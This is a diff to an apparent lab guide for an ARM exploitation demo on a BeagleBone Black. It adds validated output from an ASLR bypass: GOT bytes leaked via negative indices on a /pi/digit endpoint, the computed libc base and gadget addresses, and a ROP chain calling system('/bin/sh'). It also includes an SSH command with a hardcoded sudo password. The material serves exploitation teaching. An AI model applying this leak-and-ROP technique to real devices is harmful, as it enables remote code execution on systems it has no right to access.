@@ -623,17 +623,34 @@ Enable ASLR on the BBB:
 [source,bash]
 ----
 ssh <user>@<bbb-ip> \
-  "echo 2 | sudo tee /proc/sys/kernel/randomize_va_space"
+  "echo embed | sudo -S sh -c 'echo 2 > /proc/sys/kernel/randomize_va_space'"
 ----
 
-Then run the exploit — it SSHes to the BBB first to confirm ASLR is active:
+Restart the service so the new process is mapped under ASLR, then run the
+exploit — it SSHes to the BBB first to confirm ASLR is active:
 
 [source,bash]
 ----
 python3 demos/aslr_bypass.py http://<bbb-ip>:8080 <ssh-user> <ssh-password>
 ----
 
-Expected output in Terminal B:
+=== Validated output (live BBB run)
+
+The following output was captured during validation against a BeagleBone Black
+Rev C running the service with `randomize_va_space=2`.
+
+Raw GOT bytes leaked by the four `/pi/digit` requests:
+
+----
+n=-187  →  0x3d
+n=-186  →  0x1e
+n=-185  →  0xd7
+n=-184  →  0xb6
+----
+
+Assembled little-endian: `0xb6d71e3d` — the runtime address of `snprintf`.
+
+Full script output:
 
 ----
 [*] Checking ASLR on 192.168.7.2 via SSH (embed) …
@@ -641,19 +658,34 @@ Expected output in Terminal B:
 [+] Service alive: {'running': False, 'digit': 0, 'place': 0}
 
 [*] Leaking snprintf@GOT via /pi/digit  (n = [-187, -186, -185, -184])
-[+] snprintf runtime address : 0xb6f27e3d
-[+] libc base    : 0xb6eef000
-[+] gadget       : 0xb6f48cfc  (libc+0x59cfc, ARM, bit0=0)
-[+] "/bin/sh"    : 0xb6fbC660  (libc+0xcd660)
-[+] system()     : 0xb6f1d211  (libc+0x2e211, Thumb)
+[+] snprintf runtime address : 0xb6d71e3d
+[+] libc base    : 0xb6d39000
+[+] gadget       : 0xb6d92cfc  (libc+0x59cfc, ARM, bit0=0)
+[+] "/bin/sh"    : 0xb6e06660  (libc+0xcd660)
+[+] system()     : 0xb6d67211  (libc+0x2e211, Thumb)
+
+[*] ROP chain (108 B):
+    AAAA...  ← 92-byte padding to saved LR
+    0xb6d92cfc  ← pop {r0, r4, pc} → ARM mode
+    0xb6e06660  ← "/bin/sh" → r0
+    JUNK        ← junk → r4
+    0xb6d67211  ← system() → pc, Thumb mode
 
 [*] Sending exploit → http://192.168.7.2:8080/pi/start …
-[*] (ReadTimeout) — system() is running, shell active on BBB
+[*] Shell will appear in the BBB SSH terminal.
+[*] (ConnectionError) — system() is running, shell active on BBB
 ----
 
-The libc base (`0xb6eef000` above) will differ from the ASLR-disabled value
-(`0xb6d5b000`) and will change on every service restart — the exploit adapts
-automatically.
+The computed libc base `0xb6d39000` is page-aligned and differs from the
+ASLR-disabled base `0xb6d5b000`, confirming that ASLR randomisation is active
+and that the leak correctly identifies the new mapping.
+
+NOTE: The validation run used a background `nohup` service (no interactive
+terminal), so `sh` received `/dev/null` as stdin, exited immediately, and
+`system()` returned — causing the service to crash with a `ConnectionError`
+rather than block with a `ReadTimeout`.  When the service is launched
+interactively from an SSH session (the normal lab setup), `sh` inherits the
+SSH pty, waits for commands, and the connection times out instead.
 
 == Key Pitfalls Encountered
 
